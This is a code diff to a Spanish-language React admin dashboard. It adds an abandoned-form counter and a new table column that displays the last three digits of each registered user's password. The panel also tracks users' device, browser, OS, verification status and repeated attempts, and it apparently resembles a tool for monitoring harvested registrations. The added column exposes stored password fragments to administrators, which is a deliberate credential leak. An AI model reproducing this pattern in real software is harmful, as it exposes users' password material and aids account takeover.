@@ -177,6 +177,11 @@ export default function Admin() {
   const registrosPendientes = registros.filter(r => r.verificado === 'pendiente').length;
   const registrosRechazados = registros.filter(r => r.verificado === 'rechazado').length;
 
+  // Contar formularios abandonados (sesiones sin clics)
+  const sessionesConClics = new Set(eventos.filter(e => e.eventType === 'BUTTON_CLICK').map(e => e.sessionId));
+  const todasLasSesiones = new Set(eventos.map(e => e.sessionId));
+  const formulariosAbandonados = todasLasSesiones.size - sessionesConClics.size;
+
   // Contar usuarios únicos por SO (no eventos)
   const soCount = registros.reduce((acc, r) => {
     const so = r.os || 'Desconocido';
@@ -374,6 +379,7 @@ export default function Admin() {
                     <th className="text-left py-3 px-4">Dispositivo</th>
                     <th className="text-left py-3 px-4">Navegador</th>
                     <th className="text-left py-3 px-4">SO</th>
+                    <th className="text-left py-3 px-4">Contraseña (3 dígitos)</th>
                     <th className="text-left py-3 px-4">Estado</th>
                   </tr>
                 </thead>
@@ -387,6 +393,7 @@ export default function Admin() {
                       <td className="py-3 px-4">{registro.deviceType || 'Desconocido'}</td>
                       <td className="py-3 px-4">{registro.browser || 'Desconocido'}</td>
                       <td className="py-3 px-4">{registro.os || 'Desconocido'}</td>
+                      <td className="py-3 px-4 font-mono text-yellow-400">{(registro as any).passwordLast3Digits ? `***${(registro as any).passwordLast3Digits}` : '-'}</td>
                       <td className="py-3 px-4">
                         <button
                           onClick={() => toggleVerificacion(registro.id)}
@@ -531,12 +538,16 @@ export default function Admin() {
                 { type: 'FORM_ABANDON', label: 'Formularios Abandonados', color: 'red' },
                 { type: 'MULTI_ATTEMPT', label: 'Intentos Múltiples', color: 'orange' },
               ].map(({ type, label, color }) => {
-                const count = eventos.filter(e => e.eventType === type).length;
+                let count = eventos.filter(e => e.eventType === type).length;
+                // Para FORM_ABANDON, usar el cálculo de sesiones sin clics
+                if (type === 'FORM_ABANDON') {
+                  count = formulariosAbandonados;
+                }
                 return (
                   <div key={type} className="bg-gray-800 border border-gray-700 rounded-lg p-4">
                     <p className="text-gray-400 text-sm mb-2">{label}</p>
                     <p className={`text-3xl font-bold text-${color}-400`}>{count}</p>
-                    <p className="text-xs text-gray-500 mt-2">eventos registrados</p>
+                    <p className="text-xs text-gray-500 mt-2">{type === 'FORM_ABANDON' ? 'sesiones sin clics' : 'eventos registrados'}</p>
                   </div>
                 );
               })}
